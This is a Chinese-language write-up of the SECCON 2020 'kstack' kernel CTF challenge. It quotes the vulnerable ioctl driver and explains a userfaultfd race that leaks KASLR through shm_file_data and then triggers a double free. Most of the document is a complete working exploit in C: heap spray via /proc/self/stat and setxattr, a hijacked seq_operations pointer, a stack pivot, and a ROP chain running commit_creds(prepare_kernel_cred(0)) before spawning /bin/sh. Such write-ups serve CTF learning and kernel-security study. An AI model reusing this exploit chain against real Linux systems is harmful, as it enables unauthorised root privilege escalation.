# SECCON2020-kstack


# Kstack

这个题目同样提供了源码。

```c
typedef struct _Element {
  int owner;
  unsigned long value;
  struct _Element *fd;
} Element;

Element *head = NULL;

static long proc_ioctl(struct file *filp, unsigned int cmd, unsigned long arg) {
  Element *tmp, *prev;
  int pid = task_tgid_nr(current);
  switch (cmd) {
  case CMD_PUSH:
    tmp = kmalloc(sizeof(Element), GFP_KERNEL);
    tmp->owner = pid;
    tmp->fd = head;
    head = tmp;
    if (copy_from_user((void *)&tmp->value, (void *)arg,
                       sizeof(unsigned long))) {
      head = tmp->fd;
      kfree(tmp);
      return -EINVAL;
    }
    break;

  case CMD_POP:
    for (tmp = head, prev = NULL; tmp != NULL; prev = tmp, tmp = tmp->fd) {
      if (tmp->owner == pid) {
        if (copy_to_user((void *)arg, (void *)&tmp->value,
                         sizeof(unsigned long)))
          return -EINVAL;
        if (prev) {
          prev->fd = tmp->fd;
        } else {
          head = tmp->fd;
        }
        kfree(tmp);
        break;
      }
      if (tmp->fd == NULL)
        return -EINVAL;
    }
    break;
  }
  return 0;
}
```

它实现了一个链栈，head是栈顶。每个栈帧都与请求进程的pid绑定。很明显的漏洞是，**head是一个全局变量，对其的任何操作都没有加锁。**

## leak

由于kaslr我们首先泄漏内核地址。现在已知`push`可以写内存，而`pop`可以读内存。通过条件竞争造成不一致情况，我们希望在`copy_to_user`时`Element->value`的位置有内核地址。参考ptr-yudai师傅的博客：[Kernel Exploitで使える構造体集](https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628)。这里有两个结构可以选择: `shm_file_data`和`seq_operations`。我选择的是第一个。

首先创建一个共享内存，这时内核为进行申请了一个`shm_file_data`。然后，删除这个共享内存。内核会将`shm_file_data`给free掉。接着`push`，新建的`Element`就可以复用这块内存。在`copy_from_user`处触发 page fault 。此时`Element->value`没有被修改，还保持着原来的值。在 userfaultfd 中，`pop`这个值到指定的位置。这样我们就泄漏了地址。

## double free

使用类似的手法，可以将同一个`Element`给`pop`两次，这样我们得到了两个相同大小的`slab`。其中一个通过`open("/proc/self/stat")`分配给`seq_operations`。此结构体中包含对fd操作的各种内核函数指针。另一块通过`setxttar`分配，可以修改整个内存空间（setxttar可以修改很大的内存，可以用来堆喷），这里我们只要修改你要劫持的指针即可，我这里选择的是`*next`。

题目没有开启smap，可以通过gadget进行stack pivot，最后ROP实现提权。

# The full exp

```c
#define _GNU_SOURCE
#include <assert.h>
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/userfaultfd.h>
#include <malloc.h>
#include <netinet/in.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/shm.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/xattr.h>
#include <unistd.h>

#include "./src/kstack.h"
#define PAGE_SIZE 4096

void die(const char *msg) {
  fprintf(stderr, msg, strlen(msg), 0);
  exit(-1);
}

int global_fd;
int shmid;
int fds[0x80];
int sfd;
void *target = NULL;
uint64_t kernbase;
uint64_t modprobe_path;

uint64_t user_cs, user_sp, user_ss, user_rflags;

void push(uint64_t *value) {
  if (ioctl(global_fd, CMD_PUSH, value) < 0) {
    die("[!] Failed to push\n");
  }
  printf("[*] pushed --> 0x%.8lx\n", *value);
}

void pop(uint64_t *value) {
  if (ioctl(global_fd, CMD_POP, value) < 0) {
    die("[!] Failed to pop\n");
  }
  printf("[*] poped --> 0x%.8lx\n", *value);
}

void save_state() {
  __asm__(".intel_syntax noprefix;"
          "mov user_cs, cs;"
          "mov user_ss, ss;"
          "mov user_sp, rsp;"
          "pushf;"
          "pop user_rflags;"
          ".att_syntax;");
  puts("[*] Saved state");
}

void pop_shell() {
  char *argv1[] = {"/bin/cat", "/flag", NULL};
  char *envp1[] = {NULL};
  execve("/bin/cat", argv1, envp1);
  char *envp[] = {NULL};
  char *argv[] = {"/bin/sh", NULL};
  execve("/bin/sh", argv, envp);
}

static void fault_handler_thread(void *arg) {
  puts("[+] entered fault_handler_thread!");

  static struct uffd_msg msg;
  static int fault_cnt = 0;
  struct uffdio_copy uc;
  uint64_t uffd = (uint64_t)arg;
  struct pollfd pollfd;
  int nready;
  void *value = NULL;
  pollfd.fd = uffd;
  pollfd.events = POLLIN;

  puts("[+] polling...");
  while ((nready = poll(&pollfd, 1, -1)) > 0) {
    if (pollfd.revents & POLLERR || pollfd.revents & POLLHUP) {
      die("[!] poll failed\n");
    }
    if ((read(uffd, &msg, sizeof(msg))) == 0) {
      die("[!] read uffd msg failed\n");
    }
    if (msg.event != UFFD_EVENT_PAGEFAULT) {
      die("[!] unexpected pagefault\n");
    }
    if (fault_cnt++ == 0) {
      value = mmap(0, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
      strcpy(value, "AAAAAAAA\x00");
      printf("[+] page fault: %p\n", (void *)msg.arg.pagefault.address);
      pop(value);
      puts("[+] heap spray...");
      for (int i = 0; i < 0x80; i++) {
        fds[i] = open("/proc/self/stat", O_RDONLY);
      }
      uc.src = (unsigned long)value;
    } else {
      value = mmap(0, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
      strcpy(value, "AAAAAAAA\x00");
      printf("[+] page fault: %p\n", (void *)msg.arg.pagefault.address);
      pop(value);
      puts("[+] double free");
      uc.src = (unsigned long)value;
    }

    uc.len = PAGE_SIZE;
    uc.dst = (unsigned long)msg.arg.pagefault.address & ~(PAGE_SIZE - 1);
    uc.mode = 0;
    uc.copy = 0;
    if (ioctl(uffd, UFFDIO_COPY, &uc) == -1) {
      die("[!] ioctl-UFFDIO_COPY");
    }

    break;
  }
  puts("[+] exit fault_handler_thread!");
}

void RegisterUserfault(void *fault_page, void *handler) {
  pthread_t phr;
  struct uffdio_api ua;
  struct uffdio_register ur;
  uint64_t uufd;
  int s;

  uufd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
  if (uufd < 0) {
    die("[!] Failed to register userfaultfd\n");
  }

  ua.api = UFFD_API;
  ua.features = 0;

  if (ioctl(uufd, UFFDIO_API, &ua) == -1) {
    die("[!] Failed ioctl UFFDIO_API\n");
  }

  ur.range.start = (unsigned long)fault_page;
  ur.range.len = PAGE_SIZE;
  ur.mode = UFFDIO_REGISTER_MODE_MISSING;
  if (ioctl(uufd, UFFDIO_REGISTER, &ur) == -1) {
    die("[!] Failed ioctl UFFDIO_REGISTER\n");
  }

  s = pthread_create(&phr, NULL, handler, (void *)uufd);
  if (s != 0) {
    die("[!] Failed pthread_create\n");
  }
}

// create a share memory --> free it --> push --> page fault --> pop --> leaks
//
void createShareMemory() {
  if ((shmid = shmget((key_t)0xdead, PAGE_SIZE, 0640 | IPC_CREAT)) == -1) {
    die("[!] Failed shmget\n");
  }
  void *share = NULL;
  if ((share = shmat(shmid, 0, 0)) == (void *)-1) {
    die("[!] Failed shmat\n");
  }
  printf("[+] get share memory at %p\n", share);
  if ((shmctl(shmid, IPC_RMID, 0)) == -1) {
    die("[!] Failed shmctl\n");
  }
  printf("[+] share memory free: %p\n", share);
}

int main(int argc, char **argv) {
  save_state();

  global_fd = open("/proc/stack", O_RDWR);
  if (global_fd < 0) {
    die("[!] Could not open /proc/stack\n");
  }
  target = mmap(0, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC,
                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

  createShareMemory();
  RegisterUserfault(target, fault_handler_thread);
  push(target);
  if ((*(uint64_t *)target) == 0) {
    die("[!] leak failed, try again");
  }
  kernbase = *(uint64_t *)target - 0x13be80;
  modprobe_path = kernbase + 0xc2c540;
  printf("[*] kernbase --> 0x%lx\n", kernbase);
  printf("[+] modprobe_path --> 0x%lx\n", modprobe_path);

  // sleep(10);
  push(calloc(1, sizeof(uint64_t)));
  // pop --> page fault --> pop free --> double free
  target = mmap(0, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC,
                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

  RegisterUserfault(target, fault_handler_thread);
  pop(target);

  sfd = open("/proc/self/stat", O_RDONLY);
  if (sfd < 0) {
    die("[!] Failed to open /proc/self/stat\n");
  }

  /**
		kernel 0xffffffff81000000
		0xffffffff81047070 0xc9fffff0
		ffffffffbde00a34 swapgs_restore_regs_and_return_to_usermode
		ffffffffbd869e00 prepare_kernel_cred
		ffffffffbd869c10 commit_creds
		0xffffffff8101877f mov rdi, rax; rep pop rbp
		0xffffffff8122beb4 pop r8
		0xffffffff8110dc0f pop rdx
		*/
  uint64_t stack_pivot = kernbase + 0x47070L;
  uint64_t swapgs_restore_regs_and_return_to_usermode = kernbase + 0x600a34L;
  uint64_t prepare_kernel_cred = kernbase + 0x69e00L;
  uint64_t commit_creds = kernbase + 0x69c10L;
  uint64_t pop_rdi = kernbase + 0x34505L;
  uint64_t mov_rdi_rax_pop = kernbase + 0x1877fL;
  uint64_t pop_r8 = kernbase + 0x22beb4L;
  uint64_t pop_rdx = kernbase + 0x10dc0fL;
  uint64_t pop_rcx = kernbase + 0x38af4L;

  uint64_t *rop = mmap((void *)0xc9fff000, 4 * PAGE_SIZE,
                       PROT_READ | PROT_WRITE | PROT_EXEC,
                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
  printf("[+] fake stack: %p\n", rop);
  printf("[+] stack pivot: 0x%lx\n", stack_pivot);
  // sleep(5);
  int off = 0;
  rop = (void *)0xc9fffff0;
  rop[off++] = pop_rdi;
  rop[off++] = 0;
  rop[off++] = prepare_kernel_cred;
  rop[off++] = pop_rcx;
  rop[off++] = 0;
  rop[off++] = mov_rdi_rax_pop;
  rop[off++] = 0;
  rop[off++] = commit_creds;
  rop[off++] = swapgs_restore_regs_and_return_to_usermode + 22;
  rop[off++] = 0;
  rop[off++] = 0;
  rop[off++] = (uint64_t)&pop_shell;
  rop[off++] = user_cs;
  rop[off++] = user_rflags;
  rop[off++] = user_sp;
  rop[off++] = user_ss;

  char *buf = malloc(0x20);
  *((uint64_t *)buf + 3) = stack_pivot;
  setxattr("/tmp", "Niebelungen", buf, 0x20, XATTR_CREATE);

  read(sfd, buf, 0x10);
  
}
```

